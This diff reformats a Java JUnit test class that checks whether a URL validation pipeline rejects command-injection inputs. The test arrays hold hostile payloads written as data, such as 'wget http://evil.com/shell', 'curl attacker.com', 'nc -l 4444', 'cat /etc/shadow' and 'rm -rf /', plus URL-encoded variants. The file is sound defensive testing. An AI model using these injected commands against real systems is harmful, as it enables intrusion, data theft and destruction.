@@ -109,14 +109,14 @@ class CommandInjectionAttackTest {
 
         assertTrue(
                 exception.getFailureType() == UrlSecurityFailureType.COMMAND_INJECTION_DETECTED ||
-                exception.getFailureType() == UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED ||
-                exception.getFailureType() == UrlSecurityFailureType.INVALID_CHARACTER,
+                        exception.getFailureType() == UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED ||
+                        exception.getFailureType() == UrlSecurityFailureType.INVALID_CHARACTER,
                 "Command injection should be detected with appropriate failure type, got: " + exception.getFailureType()
         );
 
         assertTrue(eventCounter.getCount(UrlSecurityFailureType.COMMAND_INJECTION_DETECTED) +
-                   eventCounter.getCount(UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED) +
-                   eventCounter.getCount(UrlSecurityFailureType.INVALID_CHARACTER) > 0,
+                eventCounter.getCount(UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED) +
+                eventCounter.getCount(UrlSecurityFailureType.INVALID_CHARACTER) > 0,
                 "Security event counter should track command injection detection");
     }
 
@@ -133,7 +133,7 @@ class CommandInjectionAttackTest {
         long milliseconds = duration / 1_000_000;
 
         assertTrue(milliseconds < 8,
-                String.format("Command injection validation took %dms, should be < 8ms for pattern: %s",
+                "Command injection validation took %dms, should be < 8ms for pattern: %s".formatted(
                         milliseconds, sanitizeForDisplay(commandPattern)));
     }
 
@@ -141,21 +141,21 @@ class CommandInjectionAttackTest {
     @DisplayName("Known dangerous command injection patterns should be rejected")
     void shouldRejectKnownCommandInjectionAttacks() {
         String[] knownAttacks = {
-            "http://example.com?cmd=ls; cat /etc/passwd",
-            "https://site.org?file=data.txt && whoami", 
-            "http://app.com?input=test | ps aux",
-            "https://api.com?param=value; rm -rf /",
-            "http://test.com?data=$(whoami)",
-            "https://secure.com?file=`cat /etc/shadow`",
-            "http://domain.com?cmd=test; sleep 5",
-            "https://web.org?input=data || net user",
-            "http://site.com?param=val & ipconfig",
-            "https://app.org?file=test.txt > /tmp/pwned",
-            "http://example.org?cmd=ls -la /root/",
-            "https://test.com?input=; wget http://evil.com/shell",
-            "http://app.com?data=test && curl attacker.com",
-            "https://site.org?param=val | nc -l 4444",
-            "http://domain.com?file=data; kill -9 $$"
+                "http://example.com?cmd=ls; cat /etc/passwd",
+                "https://site.org?file=data.txt && whoami",
+                "http://app.com?input=test | ps aux",
+                "https://api.com?param=value; rm -rf /",
+                "http://test.com?data=$(whoami)",
+                "https://secure.com?file=`cat /etc/shadow`",
+                "http://domain.com?cmd=test; sleep 5",
+                "https://web.org?input=data || net user",
+                "http://site.com?param=val & ipconfig",
+                "https://app.org?file=test.txt > /tmp/pwned",
+                "http://example.org?cmd=ls -la /root/",
+                "https://test.com?input=; wget http://evil.com/shell",
+                "http://app.com?data=test && curl attacker.com",
+                "https://site.org?param=val | nc -l 4444",
+                "http://domain.com?file=data; kill -9 $$"
         };
 
         for (String attack : knownAttacks) {
@@ -165,8 +165,8 @@ class CommandInjectionAttackTest {
 
             assertTrue(
                     exception.getFailureType() == UrlSecurityFailureType.COMMAND_INJECTION_DETECTED ||
-                    exception.getFailureType() == UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED ||
-                    exception.getFailureType() == UrlSecurityFailureType.INVALID_CHARACTER,
+                            exception.getFailureType() == UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED ||
+                            exception.getFailureType() == UrlSecurityFailureType.INVALID_CHARACTER,
                     "Command injection should be properly categorized for: " + sanitizeForDisplay(attack)
             );
         }
@@ -176,16 +176,16 @@ class CommandInjectionAttackTest {
     @DisplayName("Command injection detection should handle edge cases")
     void shouldHandleEdgeCasesInCommandInjection() {
         String[] edgeCases = {
-            "http://example.com?cmd=test%3Bwhoami",  // URL encoded semicolon
-            "https://site.org?param=val%26%26ls",    // URL encoded &&
-            "http://app.com?data=test%7C%7Cid",      // URL encoded ||
-            "https://secure.com?input=test%0Als",    // URL encoded newline
-            "http://domain.com?file=val%0D%0Aps",    // URL encoded CRLF
-            "https://test.org?cmd=test%60whoami%60", // URL encoded backticks
-            "http://site.com?param=test%24%28id%29", // URL encoded $()
-            "https://app.org?data=test%3E/tmp/out",  // URL encoded redirection
-            "http://web.com?input=test%20%26%20ps",  // URL encoded space and &
-            "https://domain.org?file=test%7Ccat"     // URL encoded pipe
+                "http://example.com?cmd=test%3Bwhoami",  // URL encoded semicolon
+                "https://site.org?param=val%26%26ls",    // URL encoded &&
+                "http://app.com?data=test%7C%7Cid",      // URL encoded ||
+                "https://secure.com?input=test%0Als",    // URL encoded newline
+                "http://domain.com?file=val%0D%0Aps",    // URL encoded CRLF
+                "https://test.org?cmd=test%60whoami%60", // URL encoded backticks
+                "http://site.com?param=test%24%28id%29", // URL encoded $()
+                "https://app.org?data=test%3E/tmp/out",  // URL encoded redirection
+                "http://web.com?input=test%20%26%20ps",  // URL encoded space and &
+                "https://domain.org?file=test%7Ccat"     // URL encoded pipe
         };
 
         for (String edgeCase : edgeCases) {
@@ -202,16 +202,16 @@ class CommandInjectionAttackTest {
     @DisplayName("Should validate legitimate system commands are properly blocked")
     void shouldValidateLegitimateCommandBlocking() {
         String[] legitimateButDangerous = {
-            "http://example.com?backup=data; tar czf backup.tar.gz /data",
-            "https://site.org?user=admin && id admin",
-            "http://app.com?process=monitor | ps -ef | grep java", 
-            "https://secure.com?system=info || uname -a",
-            "http://domain.com?network=test; netstat -an",
-            "https://test.org?file=log.txt > /var/log/app.log",
-            "http://site.com?service=status && systemctl status nginx",
-            "https://app.org?disk=usage; df -h",
-            "http://web.com?memory=info | free -m", 
-            "https://domain.org?env=vars && printenv"
+                "http://example.com?backup=data; tar czf backup.tar.gz /data",
+                "https://site.org?user=admin && id admin",
+                "http://app.com?process=monitor | ps -ef | grep java",
+                "https://secure.com?system=info || uname -a",
+                "http://domain.com?network=test; netstat -an",
+                "https://test.org?file=log.txt > /var/log/app.log",
+                "http://site.com?service=status && systemctl status nginx",
+                "https://app.org?disk=usage; df -h",
+                "http://web.com?memory=info | free -m",
+                "https://domain.org?env=vars && printenv"
         };
 
         for (String command : legitimateButDangerous) {
@@ -221,25 +221,25 @@ class CommandInjectionAttackTest {
 
             assertTrue(
                     exception.getFailureType() == UrlSecurityFailureType.COMMAND_INJECTION_DETECTED ||
-                    exception.getFailureType() == UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED ||
-                    exception.getFailureType() == UrlSecurityFailureType.INVALID_CHARACTER,
+                            exception.getFailureType() == UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED ||
+                            exception.getFailureType() == UrlSecurityFailureType.INVALID_CHARACTER,
                     "Command should be properly classified as dangerous"
             );
         }
     }
 
     @Test
-    @DisplayName("Should handle multi-platform command injection variants")  
+    @DisplayName("Should handle multi-platform command injection variants")
     void shouldHandleMultiPlatformCommands() {
         String[] multiPlatformAttacks = {
-            "http://example.com?os=info; uname -a || systeminfo",
-            "https://site.org?shell=check && which bash || where cmd",
-            "http://app.com?version=os | cat /etc/issue || ver",
-            "https://secure.com?proc=list; ps -ef || tasklist", 
-            "http://domain.com?net=route && netstat -rn || route print",
-            "https://test.org?tasks=cron | crontab -l || schtasks",
-            "http://site.com?users=list; cat /etc/passwd || net user",
-            "https://app.org?services=status && service --status-all || sc query"
+                "http://example.com?os=info; uname -a || systeminfo",
+                "https://site.org?shell=check && which bash || where cmd",
+                "http://app.com?version=os | cat /etc/issue || ver",
+                "https://secure.com?proc=list; ps -ef || tasklist",
+                "http://domain.com?net=route && netstat -rn || route print",
+                "https://test.org?tasks=cron | crontab -l || schtasks",
+                "http://site.com?users=list; cat /etc/passwd || net user",
+                "https://app.org?services=status && service --status-all || sc query"
         };
 
         for (String attack : multiPlatformAttacks) {
@@ -256,17 +256,17 @@ class CommandInjectionAttackTest {
     @DisplayName("Should properly track command injection security events")
     void shouldTrackCommandInjectionEvents() {
         long initialCount = eventCounter.getCount(UrlSecurityFailureType.COMMAND_INJECTION_DETECTED) +
-                           eventCounter.getCount(UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED) +
-                           eventCounter.getCount(UrlSecurityFailureType.INVALID_CHARACTER);
+                eventCounter.getCount(UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED) +
+                eventCounter.getCount(UrlSecurityFailureType.INVALID_CHARACTER);
 
         String testAttack = "http://example.com?test=value; whoami";
-        
+
         assertThrows(UrlSecurityException.class,
                 () -> pipeline.validate(testAttack));
 
         long finalCount = eventCounter.getCount(UrlSecurityFailureType.COMMAND_INJECTION_DETECTED) +
-                         eventCounter.getCount(UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED) +
-                         eventCounter.getCount(UrlSecurityFailureType.INVALID_CHARACTER);
+                eventCounter.getCount(UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED) +
+                eventCounter.getCount(UrlSecurityFailureType.INVALID_CHARACTER);
 
         assertTrue(finalCount > initialCount,
                 "Command injection detection should increment security event counter");
@@ -276,11 +276,11 @@ class CommandInjectionAttackTest {
     @DisplayName("Should maintain consistent detection across similar patterns")
     void shouldConsistentlyDetectSimilarPatterns() {
         String[] similarPatterns = {
-            "http://example.com?cmd=test; ls",
-            "http://example.com?cmd=test && ls", 
-            "http://example.com?cmd=test || ls",
-            "http://example.com?cmd=test | ls",
-            "http://example.com?cmd=test & ls"
+                "http://example.com?cmd=test; ls",
+                "http://example.com?cmd=test && ls",
+                "http://example.com?cmd=test || ls",
+                "http://example.com?cmd=test | ls",
+                "http://example.com?cmd=test & ls"
         };
 
         int detectionCount = 0;
@@ -291,8 +291,8 @@ class CommandInjectionAttackTest {
                 detectionCount++;
                 assertTrue(
                         e.getFailureType() == UrlSecurityFailureType.COMMAND_INJECTION_DETECTED ||
-                        e.getFailureType() == UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED ||
-                        e.getFailureType() == UrlSecurityFailureType.INVALID_CHARACTER,
+                                e.getFailureType() == UrlSecurityFailureType.SUSPICIOUS_PATTERN_DETECTED ||
+                                e.getFailureType() == UrlSecurityFailureType.INVALID_CHARACTER,
                         "Similar pattern should have consistent detection: " + pattern
                 );
             }
@@ -304,7 +304,7 @@ class CommandInjectionAttackTest {
 
     private String sanitizeForDisplay(String input) {
         if (input == null) return "null";
-        return input.length() > 100 ? 
+        return input.length() > 100 ?
                 input.substring(0, 100) + "..." : input;
     }
 }
